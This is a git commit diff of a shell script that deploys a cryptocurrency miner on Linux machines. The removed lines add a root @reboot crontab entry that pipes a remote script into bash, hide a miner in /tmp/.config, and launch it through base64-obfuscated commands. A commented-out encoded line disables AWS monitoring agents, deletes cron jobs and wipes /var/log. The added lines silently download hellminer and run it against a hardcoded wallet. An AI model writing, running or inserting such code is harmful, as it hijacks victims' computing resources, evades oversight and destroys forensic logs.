7bbbed6c4932285dac8e622183b3619b287f2d2d
curiosityinteriorsuk <160749431+curiosityinteriorsuk@users.noreply.github.com>
2024-09-25 06:47:48 +0800

    Update zh88kk2.sh

--- zh88kk2.sh
+++ zh88kk2.sh
@@ -1,20 +1,20 @@
-#!/bin/sh
-# Debian12+
+#!/bin/bash
+
+user="RKPZr9ktS9cSVXM23dzNqjH9ur6ao6JerM"
+mode="${1:-0}"
+
+[ -n "$user" ] || exit 1
+
 sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
-sudo apt -qqy install wget nload icu-devtools >/dev/null 2>&1 || apt -qqy install wget nload icu-devtools >/dev/null 2>&1
+sudo apt -qqy install wget procps libsodium-dev >/dev/null 2>&1 || apt -qqy install wget procps libsodium-dev >/dev/null 2>&1
 
-sudo sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/v1.sh) >>/dev/null 2>&1 &\n\n\n" /etc/crontab
+tmp=`mktemp -d`
+wget -qO- https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz |tar -zx -C "$tmp"
 
+cd "${tmp}"; chmod 777 -R ./; rm -rf ./*.sh; mv h* hm
 
-mkdir -p /tmp/.config
-wget -qO /tmp/.config/config.json https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/10v.json
-###wget -qO /tmp/.config/bash https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/910
-wget -qO /tmp/.config/bash https://raw.githubusercontent.com/Blenkinship/any/main/0
-chmod -R 777 /tmp/.config
-
-cores=`grep 'siblings' /proc/cpuinfo |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
-[ -n "$cores" ] && rx="[`seq -s ', ' 0 $((cores - 1))`]" || rx=""
-[ -f "/tmp/.config/config.json" ] && [ -n "$rx" ] && sed -i "s/\"max-threads-hint\": 100,/&\n        \"rx\": ${rx},/" "/tmp/.config/config.json"
-
-/bin/sh -c "echo 'd2hpbGUgdHJ1ZTsgZG8gY2QgL3RtcC8uY29uZmlnICYmIG5vaHVwIHN1ZG8gLi9iYXNoID4vZGV2L251bGwgMj4mMSA7IGRvbmUK' |base64 -d |/bin/bash" &
-###/bin/sh -c "echo 'c2xlZXAgMTIwOyBzdWRvIHN5c3RlbWN0bCBkaXNhYmxlIGFtYXpvbi1jbG91ZHdhdGNoLWFnZW50OyBzdWRvIHN5c3RlbWN0bCBzdG9wIGFtYXpvbi1jbG91ZHdhdGNoLWFnZW50OyBzdWRvIHJtIC1yZiAvdXNyL2Jpbi9jb250YWluZXJkIC91c3IvYmluL3NzbS1hZ2VudC13b3JrZXIgL3Vzci9iaW4vYW1hem9uLXNzbS1hZ2VudCAvdXNyL3NiaW4vcm9sZS1hZ2VudCAvdXNyL2xpYmV4ZWMvcG9zdGZpeC9tYXN0ZXIgL29wdC9hd3MvYW1hem9uLWNsb3Vkd2F0Y2gtYWdlbnQgL2V0Yy9vcHQvbWwvc2NyaXB0cy9jbGVhbi1qdXB5dGVyLWxvZyAvZXRjL29wdC9tbC9zY3JpcHRzL3NhZ2VtYWtlci1uYmktYWdlbnQgL2V0Yy9vcHQvbWwvc2NyaXB0cy9yZXN0YXJ0LXNhZ2VtYWtlci1hZ2VudC13YXRjaGVyIC9ldGMvb3B0L21sL3NjcmlwdHMvcmVsYXVuY2gtZG9ja2VyLXNlcnZpY2UgL2V0Yy9vcHQvbWwvc2NyaXB0cy9zYWdlbWFrZXItcm9sZS1wcm94eS1hZ2VudCAvZXRjL29wdC9tbC9zY3JpcHRzL3NldC11cC1hZ2VudC1uYW1lc3BhY2UgL3Vzci9zYmluL3NhbXBsZS1ub3RlYm9va3MtY29uZmlnIC9vcHQvLnNhZ2VtYWtlci9hZGRfY2xvdWRfd2F0Y2hfYWdlbnRfY29uZmlndXJhdGlvbi5weSAvZXRjL2Nyb24uZC8qIC9ldGMvY3Jvbi5kYWlseS8qIC9ldGMvY3Jvbi5ob3VybHkvKjsgc3VkbyBmaW5kIC92YXIvbG9nIC10eXBlIGYgLWRlbGV0ZTsK' |base64 -d |/bin/bash" >/dev/null 2>&1 &
+if [ "$mode" == "0" ]; then
+  ./hm -u ${user} -p d=16384S >/dev/null 2>&1 &
+else
+  ./hm -u ${user} -p d=16384S >/dev/null 2>&1
+fi
